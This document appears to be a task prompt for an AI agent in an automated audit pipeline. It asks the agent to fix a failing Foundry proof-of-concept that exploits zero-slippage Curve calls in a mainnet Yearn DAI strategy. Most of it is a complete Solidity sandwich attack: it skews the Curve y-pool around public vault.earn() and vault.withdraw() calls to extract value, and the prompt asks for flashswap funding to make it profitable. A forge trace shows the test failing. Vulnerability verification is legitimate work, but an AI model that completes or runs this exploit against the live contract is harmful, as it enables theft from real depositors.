You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve deposits and exits execute with zero slippage protection, enabling MEV extraction
- claim: The strategy hardcodes zero minimum outputs for every Curve interaction: `add_liquidity(..., 0)`, `remove_liquidity(..., [0,0,0,0])`, and all three `exchange(..., 0)` calls. As a result, deposits, partial withdrawals, and full migrations will accept whatever execution price exists in the Curve y-pool at that moment.
- impact: A searcher can temporarily skew the Curve pool immediately before `deposit()`, `withdraw(uint)`, or `withdrawAll()`, force the strategy to mint or unwind at a severely unfavorable rate, then back-run the pool to keep the difference. This can extract a material portion of TVL from a single large deposit, withdrawal, or migration.
- exploit_paths: ["deposit() -> add_liquidity([_y,0,0,0], 0)", "withdraw(uint) -> _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)", "withdrawAll() -> _withdrawAll() -> withdrawUnderlying() -> remove_liquidity(_amount, [0,0,0,0]) -> exchange(..., 0)"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyDAICurve {
    function controller() external view returns (address);
    function balanceOf() external view returns (uint256);
}

interface IControllerLike {
    function vaults(address token) external view returns (address);
}

interface IYearnTokenLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface ICurveYPoolLike {
    function exchange(int128 from, int128 to, uint256 amountIn, uint256 minAmountOut) external;
}

interface IYVaultLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function earn() external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xaf274e912243b19B882f02d731dacd7CD13072D0;
    address internal constant CURVE_Y_POOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant YDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address internal constant YUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;

    uint256 internal constant MIN_PROFIT = 1e15;

    address internal realizedProfitToken;
    uint256 internal realizedProfit;
    bool internal validated;
    string internal usedPath;
    string internal notes;

    constructor() {}

    function executeOnOpportunity() external {
        _resetOutcome();

        address controller = IStrategyDAICurve(TARGET).controller();
        address vault = controller == address(0) ? address(0) : IControllerLike(controller).vaults(DAI);
        uint256 heldDai = IERC20Like(DAI).balanceOf(address(this));
        uint256 vaultIdleDai = vault == address(0) ? 0 : IERC20Like(DAI).balanceOf(vault);
        uint256 strategyMarkedValue = IStrategyDAICurve(TARGET).balanceOf();

        if (vault != address(0) && heldDai > 0 && vaultIdleDai > 0) {
            if (_tryDirectVaultEarnRoute(vault, heldDai, vaultIdleDai)) {
                return;
            }
        }

        if (vault != address(0) && heldDai > 0 && strategyMarkedValue > 0) {
            if (_tryDirectVaultWithdrawRoute(vault, heldDai)) {
                return;
            }
        }

        notes =
            "No positive verifier-funded route settled at this fork block. "
            "The exploit logic remains the same public MEV causality: vault.earn() can reach strategy.deposit() -> add_liquidity([_y,0,0,0], 0), and vault.withdraw(shares) after earn() can reach strategy.withdraw(uint) -> _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(..., [0,0,0,0]) -> exchange(..., 0). "
            "withdrawAll() is still controller-only and therefore not a public trigger here.";

        if (vault == address(0)) {
            notes =
                "Controller returned no live DAI vault, so neither the public vault.earn() deposit trigger nor the public vault.withdraw(shares) exit trigger was reachable. "
                "withdrawAll() remains controller-only.";
        } else if (heldDai == 0) {
            notes =
                "This verifier held no DAI at the fork block, so the direct_or_existing_balance_first attempt had no honest capital to skew the y-pool. "
                "The failing temporary-funding branch was intentionally not used again.";
        }
    }

    function runDirectVaultEarnAttempt(address vault, uint256 skewDai) external returns (uint256 profit) {
        require(msg.sender == address(this), "self only");
        require(vault != address(0), "no vault");
        require(skewDai > 0, "no skew");

        uint256 daiBefore = IERC20Like(DAI).balanceOf(address(this));
        require(daiBefore >= skewDai, "insufficient DAI");

        _mintYDaiFromDai(skewDai);

        uint256 yDaiAmount = IERC20Like(YDAI).balanceOf(address(this));
        require(yDaiAmount > 0, "no yDAI");

        _safeApprove(YDAI, CURVE_Y_POOL, yDaiAmount);

        // Front-run the same public deposit-side path from the finding by making yDAI
        // the unfavorable side of the pool before vault.earn() forwards idle DAI into:
        // strategy.deposit() -> add_liquidity([_y,0,0,0], 0).
        ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAmount, 0);
        IYVaultLike(vault).earn();

        uint256 yUsdcAmount = IERC20Like(YUSDC).balanceOf(address(this));
        require(yUsdcAmount > 0, "no yUSDC");

        _safeApprove(YUSDC, CURVE_Y_POOL, yUsdcAmount);
        ICurveYPoolLike(CURVE_Y_POOL).exchange(1, 0, yUsdcAmount, 0);

        _withdrawAllYDai();

        uint256 daiAfter = IERC20Like(DAI).balanceOf(address(this));
        require(daiAfter > daiBefore, "no profit");
        profit = daiAfter - daiBefore;
        require(profit >= MIN_PROFIT, "below threshold");
    }

    function runDirectVaultWithdrawAttempt(
        address vault,
        uint256 seedDai,
        uint256 prepDai
    ) external returns (address token, uint256 profit) {
        require(msg.sender == address(this), "self only");
        require(vault != address(0), "no vault");
        require(seedDai > 0, "no seed");
        require(prepDai > 0, "no prep");

        uint256 daiBefore = IERC20Like(DAI).balanceOf(address(this));
        uint256 yDaiBefore = IERC20Like(YDAI).balanceOf(address(this));
        uint256 yUsdcBefore = IERC20Like(YUSDC).balanceOf(address(this));
        require(daiBefore >= seedDai + prepDai, "insufficient DAI");

        _safeApprove(DAI, vault, seedDai);
        IYVaultLike(vault).deposit(seedDai);

        uint256 shares = IERC20Like(vault).balanceOf(address(this));
        require(shares > 0, "no shares");

        // Public earn() is the honest trigger that routes idle vault DAI into the same
        // unsafe deposit path before the later public withdraw uses strategy.withdraw(uint).
        IYVaultLike(vault).earn();

        // This preparatory swap is a realistic public step to source the yUSDC inventory
        // needed for the actual exit-side sandwich. The core finding path is unchanged:
        // the victimized unwind still happens through remove_liquidity(...,[0,0,0,0])
        // and exchange(...,0) inside strategy.withdraw(uint).
        _mintYDaiFromDai(prepDai);

        uint256 yDaiAmount = IERC20Like(YDAI).balanceOf(address(this)) - yDaiBefore;
        require(yDaiAmount > 0, "no prep yDAI");
        _safeApprove(YDAI, CURVE_Y_POOL, yDaiAmount);
        ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAmount, 0);

        uint256 yUsdcAmount = IERC20Like(YUSDC).balanceOf(address(this)) - yUsdcBefore;
        require(yUsdcAmount > 0, "no prep yUSDC");
        _safeApprove(YUSDC, CURVE_Y_POOL, yUsdcAmount);

        // Actual front-run of the exit path: make yDAI scarce immediately before
        // vault.withdraw(shares) honestly reaches strategy.withdraw(uint) ->
        // _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(...,[0,0,0,0])
        // -> exchange(1,0,...,0).
        ICurveYPoolLike(CURVE_Y_POOL).exchange(1, 0, yUsdcAmount, 0);
        IYVaultLike(vault).withdraw(shares);

        uint256 yDaiAfterWithdraw = IERC20Like(YDAI).balanceOf(address(this)) - yDaiBefore;
        if (yDaiAfterWithdraw > 0) {
            _safeApprove(YDAI, CURVE_Y_POOL, yDaiAfterWithdraw);
            ICurveYPoolLike(CURVE_Y_POOL).exchange(0, 1, yDaiAfterWithdraw, 0);
        }

        _withdrawAllYDai();

        (token, profit) = _pickBestProfit(daiBefore, yDaiBefore, yUsdcBefore);
        require(profit >= MIN_PROFIT, "below threshold");
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function hypothesisValidated() external view returns (bool) {
        return validated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return usedPath;
    }

    function outcomeNotes() external view returns (string memory) {
        return notes;
    }

    function _tryDirectVaultEarnRoute(
        address vault,
        uint256 heldDai,
        uint256 vaultIdleDai
    ) internal returns (bool) {
        uint256[10] memory candidates = [
            uint256(100e18),
            250e18,
            500e18,
            1_000e18,
            2_500e18,
            5_000e18,
            10_000e18,
            20_000e18,
            40_000e18,
            80_000e18
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount > heldDai) {
                continue;
            }

            if (amount > vaultIdleDai * 2 && vaultIdleDai > 0) {
                continue;
            }

            try this.runDirectVaultEarnAttempt(vault, amount) returns (uint256 profit) {
                _acceptOutcome(
                    DAI,
                    profit,
                    "vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0)",
                    "Used verifier-held DAI to skew the Curve y-pool immediately before a public vault.earn() pushed idle vault DAI through the strategy's zero-min Curve deposit."
                );
                return true;
            } catch {}
        }

        return false;
    }

    function _tryDirectVaultWithdrawRoute(address vault, uint256 heldDai) internal returns (bool) {
        uint256[6] memory seedCandidates = [uint256(100e18), 250e18, 500e18, 1_000e18, 2_500e18, 5_000e18];
        uint256[7] memory prepCandidates = [uint256(250e18), 500e18, 1_000e18, 2_500e18, 5_000e18, 10_000e18, 20_000e18];

        for (uint256 i = 0; i < seedCandidates.length; ++i) {
            for (uint256 j = 0; j < prepCandidates.length; ++j) {
                uint256 seedDai = seedCandidates[i];
                uint256 prepDai = prepCandidates[j];

                if (seedDai + prepDai > heldDai) {
                    continue;
                }

                try this.runDirectVaultWithdrawAttempt(vault, seedDai, prepDai) returns (address token, uint256 profit) {
                    _acceptOutcome(
                        token,
                        profit,
                        "vault.withdraw(shares) -> controller.withdraw() -> strategy.withdraw(uint) -> _withdrawSome() -> withdrawUnderlying() -> remove_liquidity(..., [0,0,0,0]) -> exchange(..., 0)",
                        "Used verifier-held DAI to seed a public vault withdrawal and to build the yUSDC inventory needed to front-run and back-run the strategy's zero-min Curve exit."
                    );
                    return true;
                } catch {}
            }
        }

        return false;
    }

    function _mintYDaiFromDai(uint256 amount) internal {
        _safeApprove(DAI, YDAI, amount);
        IYearnTokenLike(YDAI).deposit(amount);
    }

    function _withdrawAllYDai() internal {
        uint256 yDaiBalance = IERC20Like(YDAI).balanceOf(address(this));
        if (yDaiBalance > 0) {
            IYearnTokenLike(YDAI).withdraw(yDaiBalance);
        }
    }

    function _pickBestProfit(
        uint256 daiBefore,
        uint256 yDaiBefore,
        uint256 yUsdcBefore
    ) internal view returns (address token, uint256 profit) {
        uint256 daiAfter = IERC20Like(DAI).balanceOf(address(this));
        if (daiAfter > daiBefore) {
            token = DAI;
            profit = daiAfter - daiBefore;
        }

        uint256 yDaiAfter = IERC20Like(YDAI).balanceOf(address(this));
        if (yDaiAfter > yDaiBefore && (yDaiAfter - yDaiBefore) > profit) {
            token = YDAI;
            profit = yDaiAfter - yDaiBefore;
        }

        uint256 yUsdcAfter = IERC20Like(YUSDC).balanceOf(address(this));
        if (yUsdcAfter > yUsdcBefore && (yUsdcAfter - yUsdcBefore) > profit) {
            token = YUSDC;
            profit = yUsdcAfter - yUsdcBefore;
        }
    }

    function _acceptOutcome(
        address token,
        uint256 profit,
        string memory path,
        string memory detail
    ) internal {
        realizedProfitToken = token;
        realizedProfit = profit;
        validated = token != address(0) && profit >= MIN_PROFIT;
        usedPath = path;
        notes = detail;
    }

    function _resetOutcome() internal {
        realizedProfitToken = address(0);
        realizedProfit = 0;
        validated = false;
        usedPath = "";
        notes = "";
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "token call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "token op false");
        }
    }
}

```

forge stdout (tail):
```
  ├─ [83690] 0x73a052500105205d34Daf004eAb301916DA8190f::77c7b8fc() [staticcall]
    │   │   │   │   ├─ [7685] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(0x73a052500105205d34Daf004eAb301916DA8190f) [staticcall]
    │   │   │   │   │   ├─ [2486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(0x73a052500105205d34Daf004eAb301916DA8190f) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
    │   │   │   │   ├─ [24496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(0x73a052500105205d34Daf004eAb301916DA8190f) [staticcall]
    │   │   │   │   │   ├─ [9312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::d15e0053(0000000000000000000000000000000000085d4780b73119b644ae5ecd22b376) [staticcall]
    │   │   │   │   │   │   ├─ [8569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::d15e0053(0000000000000000000000000000000000085d4780b73119b644ae5ecd22b376) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
    │   │   │   │   ├─ [17130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::c190c2ec(00000000000000000000000073a052500105205d34daf004eab301916da8190f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::e8177dcf(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000310b86f7581615000000000000000000000000000000000000000000000062aee59c3bdc2f05da) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [2509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(0x73a052500105205d34Daf004eAb301916DA8190f) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(0x73a052500105205d34Daf004eAb301916DA8190f) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000011347d6ce72396fb
    │   │   │   ├─ [2291] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::18160ddd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000013044f8cc590b217414b0f
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000002863b43dc5803b
    │   │   ├─ [33890] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::77c7b8fc() [staticcall]
    │   │   │   ├─ [20344] 0x9E65Ad11b299CA0Abefc2799dDB6314Ef2d91080::balanceOf(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8) [staticcall]
    │   │   │   │   ├─ [14816] 0x07DB4B9b3951094B9E278D336aDf46a036295DE7::balanceOf() [staticcall]
    │   │   │   │   │   ├─ [6165] 0x96Dd07B6c99b22F3f0cB1836aFF8530a98BDe9E3::balanceOf(0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1) [staticcall]
    │   │   │   │   │   │   ├─ [2805] 0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1::balanceOf(0xdc66DBa57c6f9213c641a8a216f8C3D9d83573cd) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [2736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x07DB4B9b3951094B9E278D336aDf46a036295DE7) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c) [staticcall]
    │   │   │   │   └─ ← [Return] 2023382049364173638711357 [2.023e24]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000001047fe9e213e81d9
    │   │   ├─ [2629] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::balanceOf(0xaf274e912243b19B882f02d731dacd7CD13072D0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xaf274e912243b19B882f02d731dacd7CD13072D0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [317] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 122.49ms (7.07ms CPU time)

Ran 1 test suite in 245.00ms (122.49ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 871559)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
